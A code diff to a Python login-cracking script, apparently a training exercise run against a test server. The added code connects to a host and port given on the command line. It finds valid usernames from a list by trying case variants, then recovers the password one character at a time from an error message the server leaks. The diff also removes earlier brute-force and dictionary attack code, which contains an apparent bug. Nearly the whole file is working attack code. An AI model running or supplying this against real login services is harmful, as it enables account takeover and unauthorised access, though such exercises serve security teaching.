@@ -1,56 +1,67 @@
 import sys
 import socket
 from itertools import product
+import json
+import string
 
-chars = [chr(i) for i in list(range(97, 123)) + list(range(48, 58))]
-
-
-def bruteforce(sock):
-    def pass_gen():
-        return (''.join(i) for i in product(chars, repeat=length))
-
-    length = 0
-
-    while True:
-        length += 1
-        for attempt in bruteforce(chars, length):
-            sock.send(attempt.encode())
-            response = sock.recv(1024).decode()
-
-            if response == "Connection success!":
-                print(attempt)
-                return
-            elif response == "Too many attempts":
-                return
-
-
-def dict_based(sock):
-    passwords = []
-    with open('hacking/password.txt', 'r') as f:
-        for line in f:
-            passwords.append(line.strip())
-
-    for word in passwords:
-        cases = map(''.join, product(*zip(word.upper(), word.lower())))
-        for i in cases:
-            sock.send(i.encode())
-            response = sock.recv(1024).decode()
-
-            if response == "Connection success!":
-                print(i)
-                return
-            elif response == "Too many attempts":
-                return
+chars = string.ascii_letters + string.digits
 
 
 def main():
     _, ip, port = sys.argv
 
+    logins = []
+    with open('hacking/logins.txt', 'r') as f:
+        for line in f:
+            logins.append(line.strip())
+
     with socket.socket() as s:
         s.connect((ip, int(port)))
-        # bruteforce(s)
-        dict_based(s)
 
+        def get_login():
+            for login in logins:
+                cases = map(''.join, product(*zip(login.upper(), login.lower())))
+                for i in cases:
+                    data = {
+                        "login": i,
+                        "password": " "
+                    }
+                    s.send(json.dumps(data).encode())
+
+                    response = s.recv(1024).decode()
+                    response = json.loads(response)
+                    response = response['result']
+
+                    if response == "Wrong password!":
+                        return i
+                    elif response == "Exception happened during login":
+                        return
+
+        def get_password():
+            password = ""
+
+            while True:
+                for c in chars:
+                    data = {
+                        "login": login,
+                        "password": password + c
+                    }
+
+                    s.send(json.dumps(data).encode())
+                    response = s.recv(1024).decode()
+                    response = json.loads(response)
+                    response = response['result']
+
+                    if response == "Exception happened during login":
+                        break
+                    elif response == "Connection success!":
+                        return password + c
+                password += c
+
+        login = get_login()
+        password = get_password()
+
+        print('{{"login": "{}", "password": "{}"}}'.format(login, password))
 
 
 if __name__ == '__main__':
